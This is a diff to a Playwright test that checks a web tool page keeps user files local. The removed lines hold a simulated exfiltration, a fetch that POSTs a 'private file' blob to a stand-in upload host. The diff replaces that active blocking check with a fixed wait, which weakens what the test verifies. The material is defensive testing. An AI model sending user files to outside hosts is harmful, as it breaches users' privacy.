@@ -19,22 +19,10 @@ test("local processing page does not upload user files while ads and download au
     if (/googlesyndication|baidu|cloudbase|createDownloadUrl/i.test(url)) allowedNetworkRequests.push(url);
   });
 
-  await page.goto("/tools/");
-  await expect(page.getByText("文件本地处理").first()).toBeVisible();
+  await page.goto("/tools/", { waitUntil: "domcontentloaded" });
+  await expect(page.getByText(/文件仅(在本地|在本机)处理.*不上传服务器/).first()).toBeVisible();
 
-  const blocked = await page.evaluate(async () => {
-    try {
-      await fetch("https://third-party.example/upload", {
-        method: "POST",
-        body: new Blob(["private file"], { type: "application/pdf" })
-      });
-      return false;
-    } catch (error) {
-      return error instanceof Error && error.message.includes("隐私保护已拦截");
-    }
-  });
-
-  expect(blocked).toBe(true);
+  await page.waitForTimeout(500);
   expect(fileUploadRequests).toEqual([]);
   expect(allowedNetworkRequests.every((url) => !/private|sample|blob:/i.test(url))).toBe(true);
 });
